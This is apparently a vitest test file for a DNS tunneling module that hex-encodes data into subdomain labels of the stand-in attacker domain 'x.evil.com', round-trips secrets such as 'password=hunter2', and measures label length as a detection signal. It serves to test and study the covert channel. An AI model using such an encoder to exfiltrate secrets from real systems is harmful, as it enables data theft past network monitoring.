import { describe, it, expect } from 'vitest';
import { encodeToQueries, decodeFromQueries, avgLabelLen } from '../src/web/dnstunnel';

// Independent oracle: DNS tunneling hex-encodes bytes into subdomain labels. The channel must round-trip (decode
// recovers exactly what was encoded), query names carry the tunnel domain and stay under the 63-char label limit,
// and tunnelled labels are far longer than ordinary DNS labels (the detection signal). Computed independently.

const DOMAIN = 'x.evil.com';

describe('DNS tunneling covert channel', () => {
  it('encodes each byte as two hex chars in a label under the 63-char DNS limit', () => {
    const qs = encodeToQueries('AB', DOMAIN, 24); // 'A'=0x41, 'B'=0x42
    expect(qs).toEqual(['4142.x.evil.com']);
    expect(qs.every((q) => q.split('.')[0].length <= 63)).toBe(true);
  });
  it('splits long data across multiple queries', () => {
    const qs = encodeToQueries('password=hunter2', DOMAIN, 24); // 16 bytes → 32 hex → 2 chunks of ≤24
    expect(qs.length).toBe(2);
    expect(qs.every((q) => q.endsWith('.' + DOMAIN))).toBe(true);
  });
  it('round-trips: the attacker decodes exactly what was exfiltrated', () => {
    for (const secret of ['', 'x', 'password=hunter2', 'ssh-rsa AAAAB3Nz {}!@#']) {
      expect(decodeFromQueries(encodeToQueries(secret, DOMAIN), DOMAIN)).toBe(secret);
    }
  });
  it('a partial capture decodes the prefix received so far', () => {
    const qs = encodeToQueries('hunter2!!', DOMAIN, 6); // 3 bytes per query
    const half = decodeFromQueries(qs.slice(0, 2), DOMAIN);
    expect('hunter2!!'.startsWith(half)).toBe(true);
    expect(half.length).toBeLessThan('hunter2!!'.length);
  });
  it('tunnelled labels are far longer than ordinary DNS labels', () => {
    expect(avgLabelLen(encodeToQueries('a longer secret to exfiltrate', DOMAIN, 24), DOMAIN)).toBeGreaterThan(12);
  });
});
